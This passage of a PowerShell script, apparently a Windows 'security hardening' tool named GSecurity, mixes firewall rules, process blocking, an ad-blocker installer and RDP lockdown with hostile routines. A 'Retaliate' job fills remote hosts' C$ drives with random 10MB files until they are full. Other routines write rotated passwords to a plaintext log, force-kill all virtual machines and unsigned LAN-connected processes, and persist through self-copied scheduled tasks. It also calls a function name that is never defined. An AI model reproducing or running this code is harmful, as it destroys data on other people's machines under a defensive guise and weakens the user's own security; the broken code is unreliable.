                Write-Log "Error creating batch firewall rule: $_" -EntryType "Warning"
                
                # Fallback to individual rules if batch fails
                foreach ($ip in $batchIPs) {
                    try {
                        $ruleName = "Block_C2_$ip"
                        New-NetFirewallRule -Name $ruleName -DisplayName $ruleName -Direction Outbound -Action Block `
                                           -RemoteAddress $ip -ErrorAction Stop
                        $processedIp++
                        Write-Log "Blocked IP via individual firewall rule: $ip"
                    }
                    catch {
                        Write-Log "Error applying individual firewall rule for ${ip}: $_" -EntryType "Warning"
                    }
                }
            }
        }
    }
    
    Write-Log "Completed applying $processedHash/$hashCount hash-based threats, $processedAsr/$asrCount filename-based threats, and $processedIp/$ipCount Firewall rules."
    
    # Initialize telemetry
    if ($Config.Telemetry.Enabled) {
        $telemetryData = @{
            Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
            RulesApplied = @{
                Threats = $processedHash + $processedAsr
                Firewall = $processedIp
            }
            IndicatorCounts = @{
                Total = $Indicators.Count
                ByType = @{
                    Hash = ($Indicators | Where-Object { $_.Type -eq "Hash" }).Count
                    FileName = ($Indicators | Where-Object { $_.Type -eq "FileName" }).Count
                    IP = ($Indicators | Where-Object { $_.Type -eq "IP" }).Count
                    Domain = ($Indicators | Where-Object { $_.Type -eq "Domain" }).Count
                }
            }
        }
        
        $telemetryPath = $Config.Telemetry.Path
        $telemetryDir = Split-Path -Parent $telemetryPath
        
        if (-not (Test-Path $telemetryDir)) {
            New-Item -ItemType Directory -Path $telemetryDir -Force | Out-Null
        }
        
        $telemetryData | ConvertTo-Json -Depth 4 | Out-File -FilePath $telemetryPath -Encoding UTF8
        Write-Log "Saved telemetry data to $telemetryPath"
    }
}

# Monitor processes in real-time
function Start-ProcessMonitor {
    param (
        $Indicators,
        $Config
    )

    Write-Log "Starting process monitoring..."
    $fileNames = $Indicators | Where-Object { $_.Type -eq "FileName" } | ForEach-Object { $_.Value }
    
    if ($fileNames.Count -eq 0) {
        Write-Log "No file indicators to monitor" -EntryType "Warning"
        return
    }
    
    # Create a hashtable for faster lookups
    $fileNameHash = @{}
    foreach ($fileName in $fileNames) {
        $fileNameHash[$fileName.ToLower()] = $true
    }
    
    # Initialize telemetry for blocked processes
    $telemetryDir = "$env:TEMP\security_rules\telemetry"
    $blockedProcessLog = "$telemetryDir\blocked_processes.json"
    
    if (-not (Test-Path $telemetryDir)) {
        New-Item -ItemType Directory -Path $telemetryDir -Force | Out-Null
    }
    
    if (-not (Test-Path $blockedProcessLog)) {
        @{ BlockedProcesses = @() } | ConvertTo-Json | Out-File -FilePath $blockedProcessLog -Encoding UTF8
    }
    
    # Register WMI event for process creation
    Register-WmiEvent -Query "SELECT * FROM __InstanceCreationEvent WITHIN 1 WHERE TargetInstance ISA 'Win32_Process'" -Action {
        $process = $event.SourceEventArgs.NewEvent.TargetInstance
        $processName = $process.Name.ToLower()
        
        if ($fileNameHash.ContainsKey($processName)) {
            try {
                # Get additional process info before terminating
                $processInfo = @{
                    Name = $process.Name
                    PID = $process.ProcessId
                    Path = $process.ExecutablePath
                    CommandLine = $process.CommandLine
                    ParentPID = $process.ParentProcessId
                    CreationTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                }
                
                # Terminate the process
                Stop-Process -Id $process.ProcessId -Force -ErrorAction Stop
                
                # Log the blocked process
                $logMessage = "Blocked malicious process: $($process.Name) (PID: $($process.ProcessId), Path: $($process.ExecutablePath))"
                Write-EventLog -LogName "Application" -Source "GSecurity" -EventId 1001 -EntryType "Warning" -Message $logMessage
                
                # Update telemetry
                $telemetryPath = "$env:TEMP\security_rules\telemetry\blocked_processes.json"
                $telemetry = Get-Content -Path $telemetryPath -Raw | ConvertFrom-Json
                
                $telemetry.BlockedProcesses += $processInfo
                
                # Keep only the most recent events
                if ($telemetry.BlockedProcesses.Count -gt 100) {
                    $telemetry.BlockedProcesses = $telemetry.BlockedProcesses | Select-Object -Last 100
                }
                
                $telemetry | ConvertTo-Json -Depth 4 | Out-File -FilePath $telemetryPath -Encoding UTF8
            }
            catch {
                $errorMessage = "Error blocking process $($process.Name): $_"
                Write-EventLog -LogName "Application" -Source "GSecurity" -EventId 1002 -EntryType "Error" -Message $errorMessage
            }
        }
    }
    
    Write-Log "Process monitoring started with $($fileNames.Count) file indicators."
}

# Cookie Monitoring
function Invoke-CookieMonitor {
    try {
        if (-not (Test-Path $Global:Config.CookieMonitor.LogDir)) {
            New-Item -ItemType Directory -Path $Global:Config.CookieMonitor.LogDir -Force | Out-Null
        }
        if (-not (Test-Path $Global:Config.CookieMonitor.BackupDir)) {
            New-Item -ItemType Directory -Path $Global:Config.CookieMonitor.BackupDir -Force | Out-Null
        }
        
        $cookieScript = $Global:Config.CookieMonitor.TaskScriptPath
        $scriptDir = Split-Path $cookieScript -Parent
        if (-not (Test-Path $scriptDir)) {
            New-Item -ItemType Directory -Path $scriptDir -Force | Out-Null
        }
        Copy-Item -Path $PSCommandPath -Destination $cookieScript -Force
        Write-Log "Copied script to: $cookieScript"
        
        Register-ScheduledTask -TaskName "MonitorCookiesLogon" -ScriptPath $cookieScript -AtLogon
        Register-ScheduledTask -TaskName "BackupCookiesOnStartup" -ScriptPath $cookieScript -AtStartup
        Register-ScheduledTask -TaskName "MonitorCookies" -ScriptPath $cookieScript -EventQuery "<QueryList><Query Id='0' Path='Security'><Select Path='Security'>*[System[(EventID=4624)]]</Select></Query></QueryList>"
        Register-ScheduledTask -TaskName "ResetPasswordOnShutdown" -ScriptPath $cookieScript -EventQuery "<QueryList><Query Id='0' Path='System'><Select Path='System'>*[System[(EventID=1074)]]</Select></Query></QueryList>" -Arguments "-ResetPassword"
    } catch {
        Write-Log "Error in cookie monitor setup: $($_.ToString())" -EntryType "Error"
    }
}

# AdBlocker Installation
function Invoke-AdBlocker {
    $tempPath = "$env:TEMP\uBlock"
    if (-not (Test-Path $tempPath)) { New-Item -ItemType Directory -Path $tempPath -Force | Out-Null }
    $uBlockId = "cjpalhdlnbpafiamejdnhcphjbkeiagm"
    $firefoxUBlockId = "uBlock0@raymondhill.net"
    
    try {
        $release = (Invoke-WebRequest -Uri "https://api.github.com/repos/gorhill/uBlock/releases" -UseBasicParsing | ConvertFrom-Json)[0]
        $firefoxUrl = ($release.assets | Where-Object { $_.name -like "*.firefox.signed.xpi" }).browser_download_url
        $chromiumUrl = ($release.assets | Where-Object { $_.name -like "*.chromium.zip" }).browser_download_url
        
        if (Test-Path "$env:APPDATA\Mozilla\Firefox\Profiles") {
            $firefoxExtensionPath = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\extensions"
            Invoke-WebRequest -Uri $firefoxUrl -OutFile "$tempPath\uBlock.xpi"
            $firefoxProfile = Get-ChildItem -Path "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release" -Directory | Select-Object -First 1
            if ($firefoxProfile) {
                $extensionDir = "$($firefoxProfile.FullName)\extensions"
                if (-not (Test-Path $extensionDir)) { New-Item -Path $extensionDir -ItemType Directory -Force | Out-Null }
                Move-Item -Path "$tempPath\uBlock.xpi" -Destination "$extensionDir\$firefoxUBlockId.xpi" -Force
                Write-Log "Installed uBlock Origin for Firefox."
            }
        }
        
        $browsers = @(
            @{ Name = "Chrome"; Path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Extensions" },
            @{ Name = "Edge"; Path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Extensions" },
            @{ Name = "Opera"; Path = "$env:APPDATA\Opera Software\Opera Stable\Extensions" }
        )
        
        foreach ($browser in $browsers) {
            if (Test-Path $browser.Path) {
                Invoke-WebRequest -Uri $chromiumUrl -OutFile "$tempPath\uBlock.zip"
                Expand-Archive -Path "$tempPath\uBlock.zip" -DestinationPath "$tempPath\uBlock_Extracted" -Force
                $extractedFolder = Get-ChildItem -Path "$tempPath\uBlock_Extracted" -Directory | Select-Object -First 1
                $destinationPath = "$($browser.Path)\$uBlockId"
                if (Test-Path $destinationPath) { Remove-Item -Path $destinationPath -Recurse -Force }
                Move-Item -Path $extractedFolder.FullName -Destination $destinationPath -Force
                Write-Log "Installed uBlock Origin for $($browser.Name)."
            }
        }
    } catch {
        Write-Log "Error installing ad blocker: $_" -EntryType "Error"
    } finally {
        Remove-Item $tempPath -Recurse -Force -ErrorAction SilentlyContinue
    }
}

# Network Debloat
function Invoke-NetworkDebloat {
    $taskName = "NetworkDebloatStartup"
    $taskScriptPath = "C:\Windows\Setup\Scripts\NetworkDebloat.ps1"
    
    try {
        $scriptDir = Split-Path $taskScriptPath -Parent
        if (-not (Test-Path $scriptDir)) {
            New-Item -Path $scriptDir -ItemType Directory -Force | Out-Null
            Write-Log "Created folder: $scriptDir"
        }
        Copy-Item -Path $PSCommandPath -Destination $taskScriptPath -Force
        Write-Log "Copied script to: $taskScriptPath"
        
        Register-ScheduledTask -TaskName $taskName -ScriptPath $taskScriptPath -AtStartup
        
        $componentsToDisable = @("ms_server", "ms_msclient", "ms_pacer", "ms_lltdio", "ms_rspndr", "ms_tcpip6")
        $adapters = Get-NetAdapter | Where-Object { $_.Status -eq "Up" }
        foreach ($adapter in $adapters) {
            foreach ($component in $componentsToDisable) {
                Disable-NetAdapterBinding -Name $adapter.Name -ComponentID $component -Confirm:$false -ErrorAction SilentlyContinue
                Write-Log "Disabled $component on adapter $($adapter.Name)"
            }
        }
        
        $ldapPorts = @(389, 636)
        foreach ($port in $ldapPorts) {
            $ruleName = "Block LDAP Port $port"
            if (-not (Get-NetFirewallRule -DisplayName $ruleName -ErrorAction SilentlyContinue)) {
                New-NetFirewallRule -DisplayName $ruleName -Direction Outbound -Protocol TCP -RemotePort $port -Action Block -Enabled "True"
                Write-Log "Created firewall rule to block LDAP port $port"
            }
        }
    } catch {
        Write-Log "Error in network debloat: $($_.ToString())" -EntryType "Error"
    }
}

# Remote Host Drive Fill
function Invoke-FillRemoteHostDrive {
    $taskName = "RunRetaliateAtLogon"
    $taskScriptPath = "C:\Windows\Setup\Scripts\Bin\Retaliate.ps1"
    $whitelistIPs = @("192.168.1.100", "10.0.0.50") # Replace with authorized IPs
    
    try {
        if (-not $whitelistIPs) {
            Write-Log "No whitelist IPs defined. Skipping remote host drive fill for safety." -EntryType "Error"
            return
        }
        
        Write-Log "Starting remote host drive fill for whitelisted IPs: $($whitelistIPs -join ', '). Ensure you have explicit permission to perform this operation."
        
        $scriptDir = Split-Path $taskScriptPath -Parent
        if (-not (Test-Path $scriptDir)) {
            New-Item -Path $scriptDir -ItemType Directory -Force | Out-Null
            Write-Log "Created folder: $scriptDir"
        }
        Copy-Item -Path $PSCommandPath -Destination $taskScriptPath -Force
        Write-Log "Copied script to: $taskScriptPath"
        
        Register-ScheduledTask -TaskName $taskName -ScriptPath $taskScriptPath -AtLogon
        Start-Job -ScriptBlock {
            param ($whitelist, $logFunc)
            while ($true) {
                try {
                    $connections = Get-NetTCPConnection | Where-Object { $_.State -eq "Established" -and $_.RemoteAddress -in $whitelist }
                    foreach ($conn in $connections) {
                        $remoteIP = $conn.RemoteAddress
                        $remotePath = "\\$remoteIP\C$"
                        if (Test-Path $remotePath) {
                            $counter = 1
                            while ($true) {
                                try {
                                    $filePath = Join-Path -Path $remotePath -ChildPath "garbage_$counter.dat"
                                    $garbage = [byte[]]::new(10485760)
                                    (New-Object System.Random).NextBytes($garbage)
                                    [System.IO.File]::WriteAllBytes($filePath, $garbage)
                                    & $logFunc "Wrote 10MB to $filePath"
                                    $counter++
                                } catch {
                                    if ($_.Exception -match "disk full" -or $_.Exception -match "space") {
                                        & $logFunc "Drive at $remotePath is full or inaccessible."
                                        break
                                    } else {
                                        & $logFunc "Error writing to ${filePath}: $($_.ToString())"
                                    }
                                }
                            }
                        }
                    }
                } catch {
                    & $logFunc "Error in remote host drive fill: $($_.ToString())"
                }
                Start-Sleep -Seconds 30
            }
        } -ArgumentList $whitelistIPs, ${function:Write-Log}
        Write-Log "Started remote host drive fill job for whitelisted IPs: $($whitelistIPs -join ', ')"
    } catch {
        Write-Log "Error in remote host drive fill: $($_.ToString())" -EntryType "Error"
    }
}

# Remote Access Hardening
function Invoke-RemoteAccessHardening {
    try {
        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 1
        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "UserAuthentication" -Value 1
        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\RemoteApplications" -Name "fAllowToGetHelp" -Value 0
        Write-Log "Remote Desktop and Remote Assistance disabled."
        
        $rules = @(
            @{ Name = "Block RDP"; Port = 3389 },
            @{ Name = "Block VNC"; Port = "5900-5902" },
            @{ Name = "Block TeamViewer"; Port = 5938 },
            @{ Name = "Block AnyDesk"; Port = 7070 }
        )
        foreach ($rule in $rules) {
            $ruleName = $rule.Name
            if (-not (Get-NetFirewallRule -DisplayName $ruleName -ErrorAction SilentlyContinue)) {
                New-NetFirewallRule -DisplayName $ruleName -Direction Inbound -Protocol TCP -LocalPort $rule.Port -Action Block -Enabled "True"
                Write-Log "Firewall rule created: $ruleName"
            }
        }
        
        $gpPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services"
        if (-not (Test-Path $gpPath)) {
            New-Item -Path $gpPath -Force | Out-Null
            Write-Log "Created registry path: $gpPath"
        }
        Set-ItemProperty -Path $gpPath -Name "fDenyTSConnections" -Value 1
        Write-Log "Group Policy updated to disable RDP."
        
        $adminAccount = Get-LocalUser -Name "Administrator" -ErrorAction SilentlyContinue
        if ($adminAccount -and $adminAccount.Enabled) {
            Disable-LocalUser -Name "Administrator"
            Write-Log "Administrator account disabled."
        }
        
        $restrictPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System"
        if (-not (Test-Path $restrictPath)) {
            New-Item -Path $restrictPath -Force | Out-Null
            Write-Log "Created registry path: $restrictPath"
        }
        Set-ItemProperty -Path $restrictPath -Name "DisallowRun" -Value 1
        $disallowRunPath = "$restrictPath\DisallowRun"
        if (-not (Test-Path $disallowRunPath)) {
            New-Item -Path $disallowRunPath -Force | Out-Null
        }
        $softwareNames = @("TeamViewer.exe", "AnyDesk.exe")
        foreach ($i in 0..($softwareNames.Length - 1)) {
            Set-ItemProperty -Path $disallowRunPath -Name "$($i + 1)" -Value $softwareNames[$i]
        }
        Write-Log "Group policy updated to block remote access software."
        
        $ssdpService = Get-Service -Name "SSDPSRV" -ErrorAction SilentlyContinue
        if ($ssdpService -and $ssdpService.Status -ne "Stopped") {
            Stop-Service -Name "SSDPSRV" -Force -ErrorAction SilentlyContinue
            Set-Service -Name "SSDPSRV" -StartupType Disabled
            Write-Log "UPnP service disabled."
        }
        
        if (Get-Command Set-MpPreference -ErrorAction SilentlyContinue) {
            Set-MpPreference -DisableRealtimeMonitoring $false
            Write-Log "Windows Defender real-time protection enabled."
        } else {
            Write-Log "Set-MpPreference not available. Windows Defender may not be installed." -EntryType "Warning"
        }
        
        if (netstat -an | Select-String "3389") {
            Write-Log "WARNING: Port 3389 is still listening." -EntryType "Warning"
        } else {
            Write-Log "RDP port 3389 is not listening."
        }
    } catch {
        Write-Log "Error in remote access hardening: $_" -EntryType "Error"
    }
}

# Terminate Web Servers
function Invoke-TerminateWebServers {
    $lanPrefix = "192.168."
    try {
        $connections = Get-NetTCPConnection | Where-Object { $_.RemoteAddress -like "$lanPrefix*" }
        $lanProcIds = $connections.OwningProcess | Sort-Object -Unique

        foreach ($pid in $lanProcIds) {
            try {
                $proc = Get-Process -Id $pid -ErrorAction Stop
                $exePath = $proc.Path

                if ($exePath) {
                    $signature = Get-AuthenticodeSignature -FilePath $exePath
                    if ($signature.Status -ne 'Valid') {
                        Write-Log "Terminating UNSIGNED process: $($proc.ProcessName) (PID: $pid) connected to LAN"
                        Stop-Process -Id $pid -Force
                    } else {
                        Write-Log "Skipping signed process: $($proc.ProcessName) (PID: $pid)"
                    }
                } else {
                    Write-Log "Unable to determine path for process: $($proc.ProcessName) (PID: $pid)" -EntryType "Warning"
                }
            } catch {
                Write-Log "Error processing PID $pid`: $($_.ToString())" -EntryType "Warning"
            }
        }
    } catch {
        Write-Log "Error detecting web servers: $($_.ToString())" -EntryType "Error"
    }
}

# Stop Virtual Machines
function Invoke-StopVirtualMachines {
    $vmProcesses = @(
        "vmware", "vmware-vmx", "vmware-authd", "vmnat", "vmnetdhcp", "vmware-tray", "vmware-unity-helper",
        "VirtualBox", "VBoxSVC", "VBoxHeadless", "VBoxNetDHCP", "VBoxNetNAT",
        "qemu", "qemu-system", "qemu-kvm", "qemu-img",
        "vmms", "vmsrvc", "vmcompute", "hyper-vmd", "vmmem",
        "prl_client_app", "prl_cc", "prl_tools", "parallels",
        "xen", "xend", "xenstored", "xenconsoled",
        "kvm", "libvirtd", "virtqemud", "virtlogd", "virtd"
    )
    
    Get-Process | Where-Object { $vmProcesses -contains $_.ProcessName -or $_.ProcessName -match ($vmProcesses -join "|") } | ForEach-Object {
        try {
            Write-Log "Detected VM process: $($_.ProcessName) (PID: $($_.Id))"
            Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue
            Write-Log "Terminated VM process: $($_.ProcessName)"
        } catch {
            Write-Log "Error terminating VM process $($_.ProcessName): $_" -EntryType "Warning"
        }
    }
    
    $vmServices = @(
        "vmware", "VMTools", "VMUSBArbService", "VMmd", "MDHCP",
        "NATService", "VBoxDrv", "VBoxNetAdp", "VBoxNetLwf",
        "vmss", "vmcompute", "HvHost",
        "prl_cc", "prl_tools_service",
        "libmd", "md"
    )
    
    Get-Service | Where-Object { $vmServices -contains $_.Name -or $_.Name -match ($vmServices -join "|") } | ForEach-Object {
        try {
            Write-Log "Detected VM service: $($_.Name)"
            Stop-Service -Name $_.Name -Force -ErrorAction SilentlyContinue
            Set-Service -Name $_.Name -StartupType Disabled -ErrorAction SilentlyContinue
            Write-Log "Stopped and disabled VM service: $($_.Name)"
        } catch {
            Write-Log "Error stopping VM service $($_.Name): $_" -EntryType "Warning"
        }
    }
}

# Cookie Monitoring Helpers
function Invoke-RotatePassword {
    try {
        $user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name.Split('\')[1]
        $account = Get-LocalUser -Name $user
        if ($account.UserPrincipalName) {
            Write-Log "Skipping Microsoft account password change."
            return
        }
        $chars = [char[]]'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*'
        $password = -join ($chars | Get-Random -Count 12)
        $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
        Set-LocalUser -Name $user -Password $securePassword
        "$(Get-Date) - New password: $password" | Out-File -FilePath $Global:Config.CookieMonitor.PasswordLogPath -Append
        Write-Log "Rotated password."
    } catch {
        Write-Log "Password rotation error: $_" -EntryType "Error"
    }
}

function Invoke-RestoreCookies {
    try {
        if (Test-Path $Global:Config.CookieMonitor.BackupPath) {
            Copy-Item -Path $Global:Config.CookieMonitor.BackupPath -Destination $Global:Config.CookieMonitor.CookiePath -Force
            Write-Log "Cookies restored from backup."
        }
    } catch {
        Write-Log "Cookie restoration error: $_" -EntryType "Error"
    }
}

# Main Execution
function Main {
    Initialize-EventLog
    Register-ScheduledTask -TaskName "RunGSecurityAtLogon" -ScriptPath "C:\Windows\Setup\Scripts\Bin\GSecurity.ps1" -AtLogon
    Invoke-AudioEnhancements
    Invoke-BCDCleanup
    Invoke-BrowserSecurity
    Invoke-CredentialProtection
    Invoke-TelemetryCorruption
    Invoke-SecurityRules
    Invoke-PerformanceTweaks
    Invoke-CookieMonitor
    Invoke-AdBlockerInstall
    Invoke-NetworkDebloat
    Invoke-FillRemoteHostDrive
    Invoke-RemoteAccessHardening
    Start-Job -ScriptBlock {
        while ($true) {
            Invoke-TerminateWebServers
            Invoke-StopVirtualMachines
            Start-Sleep -Seconds 30
        }
    }
    Write-Log "Execution completed successfully. Reboot recommended."
}

Main